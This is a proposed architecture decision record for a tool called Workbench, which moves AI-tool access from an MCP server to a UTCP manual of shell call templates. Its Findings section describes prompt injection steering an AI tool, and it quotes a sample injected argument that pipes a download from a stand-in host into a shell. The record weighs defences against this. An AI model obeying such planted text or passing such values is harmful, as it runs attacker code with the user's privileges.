---
status: proposed
date: 2026-11-22
---

# AI tools reach the graph through UTCP, not an MCP server

The first design served AI tools with an MCP server over stdio: `workbench mcp`, one tool per query, a mode chosen at start (ADR 0009, ADR 0011). We replace it with the Universal Tool Calling Protocol (UTCP). Workbench ships a UTCP manual: a description of its query tools, each as a call template over the existing `workbench` command. An AI tool loads the manual and calls `workbench` directly. There is no server process between them.

The command line already is the one core behind every answer, so the manual adds a description of it and no second implementation. The principle "one core, two doors" holds, with the command line and the manual as the doors. Every tool in every mode still only reads, and `status` and every answer still say how fresh the graph is.

## Considered options

- **Keep the MCP server, and add UTCP next to it.** Rejected by the project owner: two protocols to specify, build and test in Release 1, for one job.
- **Keep MCP only.** Rejected by the project owner.
- **A UTCP manual that points at an MCP server.** Rejected: it keeps the server and adds a layer.

## Consequences

- `workbench mcp`, the `rmcp` crate and the MCP server of step 8 are dropped from Release 1. Step 8 becomes the manual: `workbench manual --mode <name>` prints it as JSON, with one call template per query, the `developer-support` tools, and the skills. It adds no crate: the manual is a `serde_json` value.
- The `.workbench/mcp/` folder that `init` writes is renamed `.workbench/ops/`, and `templates/mcp/` is `templates/ops/`. The pages `mcp-modes.md` and `step-8-mcp-server.md` are renamed `modes.md` and `step-8-utcp-manual.md`. The filenames of ADRs 0009 and 0011 stay as they are, and each now carries a note pointing here.
- AI tools that speak only MCP cannot use Workbench in Release 1. An MCP adapter over the same use cases is listed under Later in the roadmap.
- A mode is the list of tools a manual shows. It is not a lock: a UTCP client runs `workbench` itself, so it can run any subcommand. What keeps every mode safe is that every command only reads (capability M3), and the store is opened read-only by the query commands.
- The operational tools of Release 3 are subcommands of `workbench ops`, each listed in the `operational-support` manual as a call template. `operational-support` still reaches a deployment only through SSH, read-only, from the machine where `workbench` runs.
- Results stay on standard output, messages on standard error, with `--json` as the form an AI tool reads (rule X2, capability U8). Every call template ends in `--json`.
- The manual does not change until `workbench manual` is run again, for example after an upgrade.

## Findings

A rough draft of the manual, from the public UTCP pages, is in [utcp-manual.md](../utcp-manual.md). It is tagged `TO_REFINE` throughout. The pages say:

- A `cli` call template is a list of shell command lines. The client runs them in one generated script, and puts each argument where the command has `UTCP_ARG_<name>_UTCP_END`. The pages show the placeholder inside quotes the template author writes, warn against unsanitized input, and do not say that the client escapes values.
- The result of a call is captured with `2>&1`, so standard error is mixed into it.
- A client can load a manual by running a command that prints it, or from a file with a `text` call template.
- A crate named `rs-utcp` exists. It has not been looked at.

**Arguments are the risk that decides the design.** A tool argument is inserted into a line of shell. An AI tool can be steered, by text in the code or documents it reads, to send an argument such as `x"; curl evil | sh; echo "`. If the client inserts it as plain text, that runs as the user, and the rule that every command only reads (capability M3) holds for nothing. The explanation is in [utcp-manual.md](../utcp-manual.md#why-arguments-need-care).

**Proposed, `TO_REFINE`:** quote every placeholder; allow-list every argument in the schema, with no `"`, `$`, backtick or `\`; make `workbench manual` refuse a template that breaks this; test it with a real shell; and try a real client once with an attack value before Release 1 ships (capability M8). If the client inserts values unchecked, the fallbacks are ids only, a local HTTP call template, a sandbox, or dropping the free-text tools. This ADR stays `proposed` until the client check is done.

## Decided

- The command is `workbench manual`, and the folder `init` writes is `ops/`. Both names are agreed by the project owner.
- With `--json`, a command that succeeds writes nothing to standard error, because the client captures the result with `2>&1`. A test covers every query command.
- Every argument of a tool is required in its schema, with a default, and `*` means no filter, because a call template is a fixed line and cannot leave an argument out. `node` splits into `node` and `file`, so the manual has eleven tools. Flags that are only present or absent stay on the command line. The default values are drafts.

## Open points

Step 8, Task 1 settles these before any code is written.

- The exact UTCP version and manual fields: the draft uses what the examples show.
- Whether a real client enforces the schema or inserts values faithfully, and whether standard error reaches the result as the pages say, whether an argument given at its default value is inserted as expected, and what happens to a call that runs past 120 seconds.
- Whether a manual can carry anything for skills (K2). Proposed: the manual lists each skill with its file path and description, and the AI tool reads the file.
- Whether `rs-utcp` is worth a crate.
- Whether `status` should say that the manual was written by an older version of `workbench`.
